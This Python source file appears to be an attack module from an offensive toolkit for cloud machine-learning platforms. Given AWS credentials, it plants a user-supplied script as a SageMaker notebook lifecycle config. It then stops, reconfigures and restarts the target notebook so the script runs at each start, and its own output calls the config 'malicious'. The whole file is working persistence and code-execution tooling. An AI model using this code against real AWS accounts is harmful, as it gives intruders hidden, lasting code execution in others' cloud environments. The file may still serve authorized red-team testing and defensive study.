import base64
import os
import time

from pymlokit.modules.sagemaker._aws import boto3_clients
from pymlokit.utils.arg_utils import generate_header
from pymlokit.utils.file_utils import generate_random_name
from pymlokit.utils.table import print_table
 
 
def _list_notebook(sm, name: str) -> list[dict]:
     resp = sm.list_notebook_instances(MaxResults=100, NameContains=name)
     return resp.get("NotebookInstances", [])
 
 
def run(credential: str, platform: str, region: str, notebook_name: str, script_path: str) -> None:
     print(generate_header("add-notebook-trigger", platform))
 
     if not region or not notebook_name or not script_path:
         print("")
         print("[-] ERROR: Missing one of required command arguments")
         print("")
         return
 
     if not os.path.isfile(script_path):
         print("")
         print("[-] ERROR: Script file does not exist")
         print("")
         return
 
     print("")
     print(f"[*] INFO: Performing add-notebook-trigger module for {platform}")
     print("")
     print("[*] INFO: Checking credentials provided")
     print("")
 
     sm, _ = boto3_clients(credential, region)
 
     print("[*] INFO: Creating notebook instance lifecycle config")
     print("")
     name = f"MLOKit-{generate_random_name()}"
     content = base64.b64encode(open(script_path, "rb").read()).decode("utf-8")
     sm.create_notebook_instance_lifecycle_config(
         NotebookInstanceLifecycleConfigName=name,
         OnStart=[{"Content": content}],
     )
     print(f"[+] SUCCESS: Notebook instance lifecycle config created with name: {name}")
     print("")
 
     print(f"[*] INFO: Stopping target notebook instance with name: {notebook_name}")
     print("")
     sm.stop_notebook_instance(NotebookInstanceName=notebook_name)
     rows = []
     for n in _list_notebook(sm, notebook_name):
         rows.append(
             [
                 n.get("NotebookInstanceName", ""),
                 (n.get("CreationTime") or "").strftime("%m/%d/%Y") if hasattr(n.get("CreationTime"), "strftime") else "",
                 n.get("NotebookInstanceStatus", ""),
                 n.get("NotebookInstanceLifecycleConfigName", ""),
             ]
         )
     print_table(["Notebook Name", "Creation Date", "Notebook Status", "Notebook Lifecycle Config"], rows)
     print("")
 
     print("[*] INFO: Sleeping for 2 minutes to allow time for notebook to stop")
     print("")
     time.sleep(120)
 
     print(f"[+] SUCCESS: Notebook instance with name of {notebook_name} has been stopped successfully.")
     print("")
 
     print(f"[*] INFO: Updated notebook named {notebook_name}with lifecycle config with name {name}")
     print("")
     sm.update_notebook_instance(NotebookInstanceName=notebook_name, NotebookInstanceLifecycleConfigName=name)
 
     rows = []
     for n in _list_notebook(sm, notebook_name):
         rows.append(
             [
                 n.get("NotebookInstanceName", ""),
                 (n.get("CreationTime") or "").strftime("%m/%d/%Y") if hasattr(n.get("CreationTime"), "strftime") else "",
                 n.get("NotebookInstanceStatus", ""),
                 n.get("NotebookInstanceLifecycleConfigName", ""),
             ]
         )
     print_table(["Notebook Name", "Creation Date", "Notebook Status", "Notebook Lifecycle Config"], rows)
     print("")
 
     print("[*] INFO: Sleeping for 2 minutes to allow time for notebook instance lifecycle config to be assigned")
     print("")
     time.sleep(120)
 
     print(f"[+] SUCCESS: Malicious notebook instance lifecycle config assigned to notebook with name: {notebook_name}")
     print("")
 
     print(f"[*] INFO: Starting target notebook instance with name: {notebook_name}")
     print("")
     sm.start_notebook_instance(NotebookInstanceName=notebook_name)
 
     rows = []
     for n in _list_notebook(sm, notebook_name):
         rows.append(
             [
                 n.get("NotebookInstanceName", ""),
                 (n.get("CreationTime") or "").strftime("%m/%d/%Y") if hasattr(n.get("CreationTime"), "strftime") else "",
                 n.get("NotebookInstanceStatus", ""),
                 n.get("NotebookInstanceLifecycleConfigName", ""),
             ]
         )
     print_table(["Notebook Name", "Creation Date", "Notebook Status", "Notebook Lifecycle Config"], rows)
     print("")
 
     print("[*] INFO: Sleeping for 2 minutes to allow time for notebook to start")
     print("")
     time.sleep(120)
 
     print(f"[+] SUCCESS: Successfully started notebook with name: {notebook_name}")
     print("")
 
